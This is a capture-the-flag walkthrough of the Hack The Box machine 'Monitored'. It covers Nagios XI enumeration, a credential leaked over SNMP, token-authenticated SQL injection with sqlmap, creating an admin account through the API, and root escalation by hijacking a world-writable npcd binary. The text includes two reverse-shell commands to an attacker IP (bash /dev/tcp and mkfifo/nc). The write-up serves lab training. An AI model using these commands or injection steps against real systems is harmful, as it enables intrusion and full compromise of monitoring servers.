# HTB - Monitored

### TL;DR
This is a Debian machine hosting a Nagios tool used by an IT team for network monitoring purposes. SNMP is also running on the host for maintenance purposes, and the public tree leaks credentials for the Nagios core. These credentials can be used to get an authentication token using the API which will be subsequently used to exploit an SQLi vulnerability affecting the installed Nagios version. SQLi allows dumping the database and retrieve the admin API key that we can use to create our own admin user and get the user flag. For escalation, we abuse a writable binary found in the file system which run as root.<br>

### KEYWORDS
Nagios, ffuf enumeration, LDAP, SNMP, token authentication, SQL injection, sqlmap, binary hijacking escalation

### REFERENCES
https://www.cvedetails.com/cve/CVE-2023-40931<br>
https://rdgroup.co.za/2018/07/10/nagios-xi-5-5-is-here<br>
https://support.nagios.com/forum/viewtopic.php?p=331071#p331071<br>
https://www.exploit-db.com/exploits/44560<br>

### ENUMERATION
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Nmap scan report for 10.10.11.248
Host is up, received user-set (0.057s latency).
Not shown: 63049 closed tcp ports (conn-refused), 2481 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
389/tcp  open  ldap    syn-ack
443/tcp  open  https   syn-ack
5667/tcp open  unknown syn-ack

Nmap done: 1 IP address (1 host up) scanned in 33.02 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80,389,443,5667 -sV -sC -Pn -vv
Nmap scan report for 10.10.11.248
Host is up, received user-set (0.042s latency).
Scanned at 2024-01-13 15:54:58 EST for 18s

PORT     STATE    SERVICE    REASON      VERSION
22/tcp   open     ssh        syn-ack     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61e2e7b41b5d46dc3b2f9138e66dc5ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/xFgJTbVC36GNHaE0GG4n/bWZGaD2aE7lsFUvXVdbINrl0qzBPVCMuOE1HNf0LHi09obr2Upt9VURzpYdrQp/7SX2NDet9pb+UQnB1IgjRSxoIxjsOX756a7nzi71tdcR3I0sALQ4ay5I5GO4TvaVq+o8D01v94B0Qm47LVk7J3mN4wFR17lYcCnm0kwxNBsKsAgZVETxGtPgTP6hbauEk/SKGA5GASdWHvbVhRHgmBz2l7oPrTot5e+4m8A7/5qej2y5PZ9Hq/2yOldrNpS77ID689h2fcOLt4fZMUbxuDzQIqGsFLPhmJn5SUCG9aNrWcjZwSL2LtLUCRt6PbW39UAfGf47XWiSs/qTWwW/yw73S8n5oU5rBqH/peFIpQDh2iSmIhbDq36FPv5a2Qi8HyY6ApTAMFhwQE6MnxpysKLt/xEGSDUBXh+4PwnR0sXkxgnL8QtLXKC2YBY04jGG0DXGXxh3xEZ3vmPV961dcsNd6Up8mmSC43g5gj2ML/E=
|   256 2973c5a58daa3f60a94aa3e59f675c93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=
|   256 6d7af9eb8e45c2026ad58d4db3a3376f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7
80/tcp   open     http       syn-ack     Apache httpd 2.4.56
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open     ldap       syn-ack     OpenLDAP 2.2.X - 2.3.X
443/tcp  filtered https      no-response
5667/tcp open     tcpwrapped syn-ack
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 18.94 seconds
```
Enumerating the web server with Firefox, we find out a Nagios Xi login portal running at https://nagios.monitored.htb/nagiosxi. Nagios is an IT tool dedicated to monitor infrastructure components such as applications, OSes, networks and system metrics.

![Untitled1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/42d078f0-d32c-42d0-a127-21a22f51b7e8)

Let's start bruteforcing directories with `ffuf`. In the https://nagios.monitored.htb/nagiosxi directory we find out directories `/terminal` and `/api`
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/nagiosxi/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

images                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 48ms]
index.php               [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 81ms]
about                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 46ms]
login.php               [Status: 200, Size: 26575, Words: 5452, Lines: 467, Duration: 96ms]
help                    [Status: 301, Size: 338, Words: 20, Lines: 10, Duration: 45ms]
tools                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 44ms]
mobile                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 43ms]
admin                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 43ms]
reports                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 43ms]
account                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 52ms]
includes                [Status: 301, Size: 342, Words: 20, Lines: 10, Duration: 45ms]
install.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 82ms]
backend                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 45ms]
db                      [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 51ms]
api                     [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 90ms]
upgrade.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 99ms]
config                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 57ms]
suggest.php             [Status: 200, Size: 27, Words: 5, Lines: 1, Duration: 100ms]
views                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 51ms]
sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 45ms]
rr.php                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 154ms]
terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 159ms]
.php                    [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 45ms]
.html                   [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 47ms]

:: Progress: [350600/350600] :: Job [1/1] :: 1196 req/sec :: Duration: [0:15:18] :: Errors: 1099::
```
Fuzz again the `/api` folder to discover endpoints.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -t 100 -fc 404 -u https://nagios.monitored.htb/nagiosxi/api/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/objects.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

includes                [Status: 301, Size: 346, Words: 20, Lines: 10, Duration: 71ms]
v1                      [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 70ms]
:: Progress: [3132/3132] :: Job [1/1] :: 593 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```
Continue finding endpoints by bruteforcing the `/api/v1` folder.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-v2.txt -t 100 -fc 404 -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -fs 32 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
 :: Filter           : Response size: 32
________________________________________________

authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 1570ms]
edit source             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 46ms]
GetInvertedMatrix (see simInvertMatrix for the C-equivalent) [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 706ms]
InvertMatrix (see simGetInvertedMatrix for the Lua-equivalent) [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 66ms]
simGetInvertedMatrix (see simInvertMatrix for the C-equivalent) [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 45ms]                                                                                                                            
simInvertMatrix (see simGetInvertedMatrix for the Lua-equivalent) [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 54ms]                                                                                                                          
Text Area               [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 2138ms]
:: Progress: [7616/7616] :: Job [1/1] :: 26 req/sec :: Duration: [0:04:51] :: Errors: 28 ::
```
Take note of the `/api/v1/authenticate` endpoint and move along. Now, bruteforce the web root folder at https://nagios.monitored.htb, to find another login portal (code 401) at https://nagios.monitored.htb/nagios
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/FUZZ         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 59ms]
javascript              [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 55ms]
nagios                  [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 522ms]
.html                   [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 727ms]
.php                    [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 1715ms]
:: Progress: [350600/350600] :: Job [1/1] :: 190 req/sec :: Duration: [0:18:33] :: Errors: 0 ::
```
With this, we can consider the web enumeration over. Now we'll continue enumerating LDAP.
```markdown
> nmap $target -p389 -script discovery
Pre-scan script results:
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
Nmap scan report for monitored.htb (10.10.11.248)
Host is up (0.043s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: dc=monitored,dc=htb
|     dn: dc=monitored,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: monitored.htb
|_        dc: monitored
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       namingContexts: dc=monitored,dc=htb
|       supportedControl: 2.16.840.1.113730.3.4.18
|       supportedControl: 2.16.840.1.113730.3.4.2
|       supportedControl: 1.3.6.1.4.1.4203.1.10.1
|       supportedControl: 1.3.6.1.1.22
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.826.0.1.3344810.2.3
|       supportedControl: 1.3.6.1.1.13.2
|       supportedControl: 1.3.6.1.1.13.1
|       supportedControl: 1.3.6.1.1.12
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3
|       supportedExtension: 1.3.6.1.1.8
|       supportedLDAPVersion: 3
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedSASLMechanisms: NTLM
|       supportedSASLMechanisms: CRAM-MD5
|_      subschemaSubentry: cn=Subschema

Host script results:
|_fcrdns: FAIL (No PTR record)
| dns-brute: 
|_  DNS Brute-force hostnames: No results.

Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```
It seems SNMP is running in the host, we can confirm it with an UDP scan on port 161.
```markdown
> sudo nmap $target -sU -p161 -sC -sV -vv               
[sudo] password for kali: 
Scanning monitored.htb (10.10.11.248) [1 port]
Discovered open port 161/udp on 10.10.11.248
Nmap scan report for monitored.htb (10.10.11.248)
Host is up, received echo-reply ttl 63 (0.041s latency).
Scanned at 2024-01-14 11:22:40 EST for 10s

Bug in snmp-win32-software: no string output.
PORT    STATE SERVICE REASON              VERSION
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 2.72 Mb sent, 2.72 Mb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.248  Netmask: 255.255.254.0
|     MAC address: 005056b97a60 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 1.03 Gb sent, 390.45 Mb received
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 6f3fa7421af94c6500000000
|   snmpEngineBoots: 35
|_  snmpEngineTime: 1h56m12s
| snmp-sysdescr: Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64
|_  System uptime: 1h56m12.41s (697241 timeticks)
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:389          0.0.0.0:0
|   TCP  10.10.11.248:389     10.10.14.136:41582
|   TCP  10.10.11.248:43196   10.10.16.86:4444
|   TCP  10.10.11.248:46582   10.10.15.5:1234
|   TCP  10.10.11.248:54618   10.10.16.86:5555
|   TCP  127.0.0.1:25         0.0.0.0:0
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.1:5432       0.0.0.0:0
|   TCP  127.0.0.1:7878       0.0.0.0:0
|   TCP  127.0.0.1:47960      127.0.1.1:80
|   TCP  127.0.0.1:47968      127.0.1.1:80
|   UDP  0.0.0.0:68           *:*
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:162          *:*
|   UDP  10.10.11.248:123     *:*
|_  UDP  127.0.0.1:123        *:*
Service Info: Host: monitored

Nmap done: 1 IP address (1 host up) scanned in 10.85 seconds
           Raw packets sent: 6 (301B) | Rcvd: 2 (168B)
```
Best way to continue enumerating the public SNMP tree is to use the `snmpwalk` tool. The output provided is very large and supplies huge amount of information, among other, a list of running processes.
```markdown
> snmpwalk -c public -v1 -t 10 $target
iso.3.6.1.2.1.1.1.0 = STRING: "Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (1036224) 2:52:42.24
iso.3.6.1.2.1.1.4.0 = STRING: "Me <root@monitored.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "monitored"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1550) 0:00:15.50
…
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.3.11 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.10.0-27-amd64 root=UUID=d8761c35-f10f-4e79-b24c-38a65ad7ce1b ro net.ifnames=0 biosdevname=0 quiet"
…
iso.3.6.1.2.1.25.4.2.1.5.492 = STRING: "--config /etc/laurel/config.toml"
iso.3.6.1.2.1.25.4.2.1.5.522 = ""
iso.3.6.1.2.1.25.4.2.1.5.569 = STRING: "-d -q -s"
iso.3.6.1.2.1.25.4.2.1.5.571 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.572 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.575 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.577 = ""
iso.3.6.1.2.1.25.4.2.1.5.578 = STRING: "-u -s -O /run/wpa_supplicant"
iso.3.6.1.2.1.25.4.2.1.5.588 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.609 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
iso.3.6.1.2.1.25.4.2.1.5.621 = STRING: "-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
iso.3.6.1.2.1.25.4.2.1.5.686 = ""
iso.3.6.1.2.1.25.4.2.1.5.687 = ""
iso.3.6.1.2.1.25.4.2.1.5.731 = STRING: "-f /usr/local/nagios/etc/pnp/npcd.cfg"
iso.3.6.1.2.1.25.4.2.1.5.737 = STRING: "-LOw -f -p /run/snmptrapd.pid"
iso.3.6.1.2.1.25.4.2.1.5.750 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
iso.3.6.1.2.1.25.4.2.1.5.759 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.770 = STRING: "-p /var/run/ntpd.pid -g -u 108:116"
iso.3.6.1.2.1.25.4.2.1.5.780 = ""
iso.3.6.1.2.1.25.4.2.1.5.816 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
iso.3.6.1.2.1.25.4.2.1.5.818 = STRING: "-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d"
iso.3.6.1.2.1.25.4.2.1.5.819 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
iso.3.6.1.2.1.25.4.2.1.5.826 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.834 = STRING: "-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf"
iso.3.6.1.2.1.25.4.2.1.5.1535 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1536 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1562 = STRING: "-bd -q30m"
iso.3.6.1.2.1.25.4.2.1.5.1976 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.2081 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.2115 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
iso.3.6.1.2.1.25.4.2.1.5.2118 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.2119 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.2120 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.2121 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.2255 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
```
There are calls to a local shell script `check_host.sh` along with what seems to be a credential `svc:XjH7VCehowpR1xZB`<br>
<br>
At this point we finish the enumeration phase. Let's do a summary of what we have found so far:
- A Nagios network monitoring tool is running on port 80.
- There are 3 login pages running at:
    * https://nagios.monitored.htb/nagiosxi/login
    * https://nagios.monitored.htb/nagiosxi/terminal
    * https://nagios.monitored.htb/nagios
- Additionally, an authetication endpoint is available at https://nagios.monitored.htb/nagiosxi/api/v1/authenticate<br>
- Finally, enumerating LDAP and SNMP we have found what seem to be credentials for user svc `svc:XjH7VCehowpR1xZB`


### USER
Looking for Nagios vulnerabilities, we come across this one: https://www.cvedetails.com/cve/CVE-2023-40931<br>
<br>
It seems `ID` parameter in https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php is vulnerable to SQLi. However, we must be authenticated to launch this attack, so we need to be logged into the Nagios tool before trying the injection.<br>
<br>
If we remember, we have already found credentials `svc:XjH7VCehowpR1xZB`. The credential do not work in Nagios Xi portal https://nagios.monitored.htb/nagiosxi.login.php (an "user disabled" error is returned).<br>
<br>
Access is granted though in the Nagios core login at https://nagios.monitored.htb/nagios; however, nothing useful can be found here.

![Untitled2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/68a7d2e0-d198-4f91-83c0-ffc1174e7cad)

According to Nagios documentation (https://rdgroup.co.za/2018/07/10/nagios-xi-5-5-is-here/), user and password could theoretically be be used to login sending a POST request to the `/api/v1/authenticate` endpoint.<br>
<br>
I unsuccessfully tried to do so with `burpsuite` and `postman`, but finally found instructions in the Nagios support forum (https://support.nagios.com/forum/viewtopic.php?p=331071#p331071) to authenticate using `curl`.<br>
<br>
The following command performs the authentication and a token is received.
```markdown
> curl -k -L -X POST "https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" -d "username=svc&password=XjH7VCehowpR1xZB"

{"username":"svc","user_id":"2","auth_token":"7f3dfb4cf7830c3895d701817697b39c214237a5","valid_min":5,"valid_until":"Sun, 14 Jan 2024 09:49:36 -0500"}
```

![Untitled3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/c661c39d-5ccf-4fd2-bea8-a061da0f1514)

In summary, although the `svc` account is disabled in the web login, it seems the API is still supplying tokens for this account when queried with `curl`. We can take advantage of this now and launch the SQLi attack with `sqlmap` and passing the token as argument.
```markdown
> sqlmap --batch --dbms mysql --level 3 --risk 3 -p id -u "http://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?id=1&token=a150999b9c2b5ae2bb6c7c38b7b7c48e854838fe"
```
You have to patiently dump the databases and tables until you find the right one. In the process the token may expire so you may need to request a new one. Eventually, you end up finding an API key for user `admin` on the `nagiosxi` database and `xi_users` table.
```markdown
> sqlmap --batch --dbms mysql --level 3 --risk 3 -p id -D nagiosxi -T xi_users –dump -u "http://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?id=1&token=a150999b9c2b5ae2bb6c7c38b7b7c48e854838fe"
```

![Untitled4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/3b6b1aa0-403f-408e-b599-2771f3a9b73b)

We can use this API key to add a new admin user. In this exploit https://www.exploit-db.com/exploits/44560 I found out the API endpoint and the parameters to do so.
```markdown
> curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin17890&password=password123&name=nil&email=nil@localhost&auth_level=admin"
{
    "success": "User account admin17890 was added successfully!",
    "user_id": 18
}
```
Tips: make sure an `user_id` is received, if `null` is received your user has not been correctly created and you won't be able to use it. If that's the case, try changing paramenters; for example, in my case I found out the email had to finish in `@localhost` for the user to be correctly created.<br>
<br>
Now you can login into the Nagios Xi login site with your new admin account.

![Untitled5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/c4c83051-db13-4d12-adf4-81c6936034a9)

In the dashboard, navigate to *Configure (top menu) -> Advanced configuration -> Commands -> Add new*. Alternatively, you can edit an already existing command. In the command line field type a command to send a reverse shell to your attacker machine.
```markdown
> bash -c 'bash -i >& /dev/tcp/<your ip here>/1919 0>&1'
```
Click on `Apply Changes` to save the command. Note: I constanly received errorr when trying to apply changes; however, after checking the history, I found out that as long as the `command.cfg` file is correctly saved, everything will be ok.<br>
<br>
To issue the command navigate to *Monitoring -> Hosts -> Run check command*. Start a listener and launch the command, a reverse shell is received, and you can get the user flag.

### ROOT
Check if current user is a sudoer.
```markdown
> sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```
It seems the user can start/stop services `nagios` and `npcd` as root without supplying a password. Enumerate the binaries related to the `nagios` and `npcd` services.
```markdown
> find / -name nagios 2> /dev/null
/usr/local/nagios

> find / -name npcd 2> /dev/null
/usr/local/nagios/bin/npcd

> ls -hal /usr/local/nagios/bin/nagios
-rwxr-xr-- 1 nagios nagios 701K Jan 14 10:42 /usr/local/nagios/bin/nagios

> ls -hal /usr/local/nagios/bin/npcd
-rwxrwxrwx 1 nagios nagios 87 Jan 14 14:07 /usr/local/nagios/bin/npcd
```
Turns out we have writable access to the `npcd` binary. Stop the service using the shell script.
```markdown
> sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
```
Now edit the `npcd` file contents and add command to send a reverse shell.
```markdown
> echo '#!/bin/bash' > /usr/local/nagios/bin/npcd

> echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your ip here> >/tmp/f' >> /usr/local/nagios/bin/npcd
```
Launch a listener on port 9001 and start the `npcd` service using the script, a root reverse shell is received.
```markdown
> sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
```
